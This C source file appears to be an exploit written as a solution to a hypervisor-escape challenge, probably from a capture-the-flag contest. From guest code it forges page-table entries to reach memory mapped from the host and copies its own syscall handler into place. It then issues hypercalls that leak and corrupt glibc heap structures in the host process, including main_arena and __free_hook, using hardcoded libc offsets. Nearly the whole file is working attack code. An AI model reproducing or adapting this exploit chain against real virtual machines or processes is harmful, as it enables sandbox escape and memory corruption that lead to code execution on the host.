#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "utils/hypercall.h"

#define PDE64_PRESENT  1
#define PDE64_RW       (1U << 1)
#define PDE64_USER     (1U << 2)
#define PDE64_PS       (1U << 7)

void syscall_handler(void);

int main(void){
	void *addr;
	uint64_t *pd, *pt;

	puts("now exploiting!");

	addr = mmap((void*)0x80000000, 0x3000, PROT_READ|PROT_WRITE, 0, -1, 0);
	munmap(addr, 0x1000);
	mmap((void*)0xc0000000, 0x1000, PROT_READ|PROT_WRITE, 0, -1, 0);

	pd = addr + 0x1000;
	pt = addr + 0x2000;

	for(int i = 0; i<2; i++) // pd[0]
		pt[i] = PDE64_PRESENT | PDE64_RW | PDE64_USER | (0x1000*i);
	for(int i = 0; i<3; i++)
		pd[8+i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (0x400000 + 0x200000*i);

	memcpy((void*)0xc0001389, &syscall_handler, 0x800);

	asm("syscall");

	return 0;
}

void syscall_handler(void){
	void *libc = (void*)0xc1000000;
	void *main_arena = libc + 0x3c4b20;
	uint64_t *free_hook  = libc + 0x3c67a8;

	char *heap = (void*)0xc2000000;

	uint64_t *pd = (uint64_t*)(0x8040000000 + 0x23000);

	hc_write(main_arena + 0x58, 0x18, 0);
	hc_read(free_hook, 0x8, 0);
	hc_read(&pd[16], 0x8, 0);

	void *p[2];
	p[0] = hc_malloc(0, 0x1000);
	p[1] = hc_malloc(0, 0x1000);

	hc_free(p[0]);
	hc_read(heap+0x5b0, 0x8, 0);
	hc_free(p[1]);

	asm("hlt");
}
